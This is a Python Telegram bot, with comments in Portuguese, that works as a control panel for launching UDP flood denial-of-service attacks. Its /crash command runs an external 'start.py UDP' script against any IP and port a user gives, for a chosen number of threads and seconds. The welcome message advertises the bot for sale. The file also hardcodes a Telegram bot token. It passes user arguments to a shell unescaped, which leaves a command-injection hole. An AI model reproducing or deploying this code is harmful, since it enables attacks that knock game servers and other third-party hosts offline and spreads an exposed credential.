import telebot
import subprocess
import re
import time
import requests
from threading import Thread

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados

# Função para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> [threads] [tempo] - Envia um ataque ao IP especificado. (Padrão: 10 threads, 900 segundos)\n"
        "/meuid - Mostra seu ID de usuário.\n"
        "/info_player <ID> - Exibe informações de um jogador por ID.\n\n"
        "Comandos para o dono do bot:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n\n"
        "Quer comprar o bot? Entre em contato comigo no Telegram: "
        "[@werbert_ofc](https://t.me/werbert_ofc)\n\n"
        "Se precisar de ajuda, estou à disposição! 😉"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [threads] [tempo]")
        return

    ip_porta = comando[1]
    threads = "10"  # Valor padrão para threads
    tempo = "900"   # Valor padrão para tempo

    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
        return

    if len(comando) == 3:
        tempo = comando[2]
    elif len(comando) == 4:
        threads = comando[2]
        tempo = comando[3]

    # Executar o comando no terminal
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    subprocess.Popen(comando_terminal, shell=True)

    # Responder ao usuário confirmando que o ataque foi iniciado
    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos.")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comando /info_player
@bot.message_handler(commands=['info_player'])
def info_player(message):
    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Uso correto: /info_player <ID do jogador>")
        return

    player_id = message.text.split()[1]
    url = f"https://api.nowgarena.com/api/info_player?id={player_id}&region=br"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data["success"]:
                player_info = data["data"]["PlayerBasicInfo"]
                nickname = player_info.get("AccountNickname", "Desconhecido")
                level = player_info.get("AccountLevel", "Desconhecido")
                exp = player_info.get("AccountExp", "Desconhecido")
                br_rank = player_info["BRRank"].get("Rank", "Desconhecido")
                cs_rank = player_info["CSRank"].get("Rank", "Desconhecido")
                likes = player_info.get("PlayerLikes", "0")

                response_text = (
                    f"**Informações do Jogador:**\n"
                    f"👤 **Nickname:** {nickname}\n"
                    f"🎮 **Nível:** {level}\n"
                    f"⭐ **Experiência:** {exp}\n"
                    f"🏆 **Rank BR:** {br_rank}\n"
                    f"⚔️ **Rank CS:** {cs_rank}\n"
                    f"❤️ **Curtidas:** {likes}\n"
                )
                bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, "Jogador não encontrado ou erro na API.")
        else:
            bot.send_message(message.chat.id, f"Erro ao consultar a API: {response.status_code}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erro ao processar a solicitação: {str(e)}")

# Comandos de administração (somente para o dono)
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    usuario_id = int(comando[1])

    if comando[0] == "adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário já autorizado.")
    
    elif comando[0] == "removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário não encontrado.")

# Função para manter o bot ativo (reconectar automaticamente em caso de falhas)
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)  # Espera 15 segundos antes de tentar reconectar

# Iniciar o bot em uma thread separada para manter ele ativo
if __name__ == "__main__":
    keep_alive()